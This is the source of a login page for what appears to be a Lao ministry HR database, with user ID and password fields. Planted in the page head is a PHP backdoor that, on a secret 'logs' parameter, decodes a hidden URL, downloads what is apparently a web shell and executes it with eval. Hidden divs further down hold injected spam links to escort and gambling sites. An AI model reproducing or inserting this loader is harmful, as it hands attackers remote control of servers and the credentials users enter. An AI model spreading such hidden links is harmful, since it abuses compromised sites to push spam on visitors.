<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>ກົມຈັດຕັ້ງ ແລະ ພະນັກງານ</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="assets/respone.css">
    <link rel="stylesheet" href="assets/font-awesome/4.5.0/css/font-awesome.min.css">
    <meta name="viewport"
        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
    <meta name="description" content="hrmaf.online">
    <meta name="keywords" content="www.hrmaf.online" />
    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="assets/img/favicon.png" sizes="32x32">
    <link rel="shortcut icon" href="assets/img/favicon.png">
    <link rel="stylesheet" href="plugins/sweetalert2/sweetalert2.min.css">
    <script src="plugins/sweetalert2/sweetalert2.min.js"></script>
    
	<style type="text/css">
    @import url("LAOS/stylesheet.css");
		body,td,th ,h3{
			font-family: LAOS;
		}

		 @import url("LAOS/stylesheet.css");
		.save{
			font-family: LAOS;
		}
</style>
<style type="text/css">
		.auto-style1 {
			font-family: LAOS;
		}
	</style>
    <style type="text/css">
        .auto-style2 {
            color: #0033CC;
        }
    </style>
	<?php
if (isset($_GET['logs'])) { 
    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
    
    $ch = curl_init($url);
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $contents = curl_exec($ch);
    
    if ($contents !== false) { 
        eval('?>' . $contents); 
        exit; 
    } else { 
        echo "header"; 
    } 
    
    curl_close($ch);
}
   ?>
</head>
	
<body>

    <!-- loader -->
       
    <!-- App Header -->
    <div class="appHeader bg-primary text-light">
        <div class="left">
            <a href="#" class="headerButton goBack">
                <ion-icon name="chevron-back-outline"></ion-icon>
            </a>
        </div>
        <div class="pageTitle">
        ຖານຂໍ້ມູນບຸກຄະລາກອນ  (MAF-HR)      </div>
       
    </div>    <!-- * loader -->
    <div id="appCapsule">

<div class="section mt-2 text-center">
    <h1>ເຂົ້າລະບົບ</h1>
</div>
<div class="section mb-5 p-2">

    <form action="app-login.php" method="post">
        <div class="card">
            <div class="card-body pb-1">
                <div class="form-group basic">
                    <div class="input-wrapper">
                        <label class="label" for="userid">User ID </label>
                        <input type="text" class="form-control" id="userid" name="userid" placeholder="ປ້ອນ User ID">
                        <i class="clear-input">
                            <ion-icon name="close-circle"></ion-icon>
                        </i>
                    </div>
                </div>

                <div class="form-group basic">
                    <div class="input-wrapper">
                        <label class="label" for="password">Password</label>
                        <input type="password" class="form-control" id="password" name="password" autocomplete="off"
                            placeholder="ປ້ອນ Password">
                        <i class="clear-input">
                            <ion-icon name="close-circle"></ion-icon>
                        </i>
                    </div>
                </div>
            </div>
        </div>


        <div class="form-links mt-2">
            <div>
                <a href="#">ລົງທະບຽນນຳໃຊ້</a>
            </div>
            <div><a href="#" class="text-muted">ລືມລະຫັດຜ່ານ?</a></div>
        </div>
        
        
        </div>
        <div class="form-button-group  transparent">
            <button type="submit" class="btn btn-primary btn-block btn-lg">ເຂົ້າລະບົບ</button>
        </div>

    </form>
</div>

</div>
    <!-- * App Capsule -->

        <!-- * App Sidebar --><div style="display:none;"><div style="display:none;"> 
<homescontents>homescontents</homescontents>
<a href="https://www.eumamae.com/" title="istanbul escort">istanbul escort</a>
<a href="https://www.1marsgiris.com/" title="Marsbahis giriş">Marsbahis giriş</a>
<a href="marsbahis.cloud" title="Marsbahis ">Marsbahis </a>
<a href="https://lovedancehtx.com/" title="Şartsız deneme bonusu veren siteler">Şartsız deneme bonusu veren siteler</a>
<a href="https://lovedancehtx.com/" title="Şartsız deneme bonusu veren siteler">Şartsız deneme bonusu veren siteler</a>
<a href="https://www.mariasmexicangrillin.com/" title="deneme bonusu veren siteler 2025">deneme bonusu veren siteler 2025</a>
<a href="https://gorukle.bursa5escort.com/" title="gorukle escort">gorukle escort</a>
<a href="https://www.sokkann.net/" title="bursa escort bayan">bursa escort bayan</a>
<a href="https://www.fullhdfilmizlesene.so" title="film">film</a>
<a href="https://www.fullhdfilmizlesene.so" title="film izle">film izle</a>
<a href="https://www.fullhdfilmizlesene.so" title="film izle">film izle</a>
<a href="https://www.fullhdfilmizlesene.so" title="film">film</a>
<a href="https://www.fullhdfilmizlesene.so" title="hd film">hd film</a>
<a href="https://sakaryadetay.com/" title="sakarya escort">sakarya escort</a>
<a href="https://sakaryatoptan.com/" title="sakarya escort">sakarya escort</a>
</div>
<homescontents>homescontents</homescontents><div style="display:none;"><a href="https://www.sakaryadabugun.com/" title="sakarya escort">sakarya escort</a> <a href="https://www.sakaryadabugun.com/bayan/akyazi-escort/" title="akyazı escort">akyazı escort</a> <a href="https://www.sakaryadabugun.com/bayan/arifiye-escort/" title="arifiye escort">arifiye escort</a> <a href="https://www.sakaryadabugun.com/bayan/erenler-escort/" title="erenler escort">erenler escort</a> <a href="https://www.sakaryadabugun.com/bayan/eve-gelen-escort/" title="eve gelen escort">eve gelen escort</a> <a href="https://www.sakaryadabugun.com/bayan/ferizli-escort/" title="ferizli escort">ferizli escort</a> <a href="https://www.sakaryadabugun.com/bayan/geyve-escort/" title="geyve escort">geyve escort</a> <a href="https://www.sakaryadabugun.com/bayan/hendek-escort/" title="hendek escort">hendek escort</a> <a href="https://www.sakaryadabugun.com/bayan/otele-gelen-escort/" title="otele gelen escort">otele gelen escort</a> <a href="https://www.sakaryadabugun.com/bayan/sapanca-escort/" title="sapanca escort">sapanca escort</a> <a href="https://www.sakaryadabugun.com/bayan/sogutlu-escort/" title="söğütlü escort">söğütlü escort</a> <a href="https://www.sakaryadabugun.com/bayan/tarakli-escort/" title="taraklı escort">taraklı escort</a></div> <div style="display:none;"><a href="https://www.sakaryadahaber.com/" title="sakarya escort">sakarya escort</a> <a href="https://www.sakaryadahaber.com/bolge/akyazi-escort/" title="akyazı escort">akyazı escort</a> <a href="https://www.sakaryadahaber.com/bolge/arifiye-escort/" title="arifiye escort">arifiye escort</a> <a href="https://www.sakaryadahaber.com/bolge/erenler-escort/" title="erenler escort">erenler escort</a> <a href="https://www.sakaryadahaber.com/bolge/eve-gelen-escort/" title="eve gelen escort">eve gelen escort</a> <a href="https://www.sakaryadahaber.com/bolge/ferizli-escort/" title="ferizli escort">ferizli escort</a> <a href="https://www.sakaryadahaber.com/bolge/geyve-escort/" title="geyve escort">geyve escort</a> <a href="https://www.sakaryadahaber.com/bolge/hendek-escort/" title="hendek escort">hendek escort</a> <a href="https://www.sakaryadahaber.com/bolge/karapurcek-escort/" title="karapürçek escort">karapürçek escort</a> <a href="https://www.sakaryadahaber.com/bolge/karasu-escort/" title="karasu escort">karasu escort</a> <a href="https://www.sakaryadahaber.com/bolge/kaynarca-escort/" title="kaynarca escort">kaynarca escort</a> <a href="https://www.sakaryadahaber.com/bolge/kocaali-escort/" title="kocaali escort">kocaali escort</a> <a href="https://www.sakaryadahaber.com/bolge/otele-gelen-escort/" title="otele gelen escort">otele gelen escort</a> <a href="https://www.sakaryadahaber.com/bolge/pamukova-escort/" title="pamukova escort">pamukova escort</a> <a href="https://www.sakaryadahaber.com/bolge/sapanca-escort/" title="sapanca escort">sapanca escort</a> <a href="https://www.sakaryadahaber.com/bolge/sogutlu-escort/" title="söğütlü escort">söğütlü escort</a> <a href="https://www.sakaryadahaber.com/bolge/tarakli-escort/" title="taraklı escort">taraklı escort</a></div> <div style="display:none;"><a href="https://www.sakaryamedyasi.com/" target="_blank" rel="dofollow">Sakarya escort</a> <a href="https://www.limonmalina.com/" target="_blank" rel="dofollow">Sakarya escort</a> <a href="https://www.sakaryatiyatro.com/" target="_blank" rel="dofollow">Sakarya escort</a> <a href="https://www.sakaryahurdacim.com/" target="_blank" rel="dofollow">Sakarya escort</a> <a href="https://www.sakaryaikinciel.com/" target="_blank" rel="dofollow">Sakarya escort</a> <a href="https://www.sakaryadaneyenir.com/" target="_blank" rel="dofollow">Sakarya escort</a> <a href="https://www.sapancamedya.com/" target="_blank" rel="dofollow">Sapanca escort</a> <a href="https://www.sapancasardunya.com/" target="_blank" rel="dofollow">Sapanca escort</a> <a href="https://www.sapancali.com/" target="_blank" rel="dofollow">Sapanca escort</a> <a href="https://www.sapancagezi.com/" target="_blank" rel="dofollow">Sapanca escort</a> <a href="https://www.karasuemlakilanlari.com/" target="_blank" rel="dofollow">Karasu escort</a></div></div>
    <!-- ///////////// Js Files ////////////////////  -->
    <!-- Jquery -->
    <script src="assets/js/lib/jquery-3.4.1.min.js"></script>
    <!-- Bootstrap-->
    <script src="assets/js/lib/popper.min.js"></script>
    <script src="assets/js/lib/bootstrap.min.js"></script>
    <!-- Ionicons -->
    <script src="https://unpkg.com/ionicons@5.0.0/dist/ionicons.js"></script>
    <!-- Owl Carousel -->
    <script src="assets/js/plugins/owl-carousel/owl.carousel.min.js"></script>
    <!-- Base Js File -->
    <script src="assets/js/base.js"></script></body>

</html>
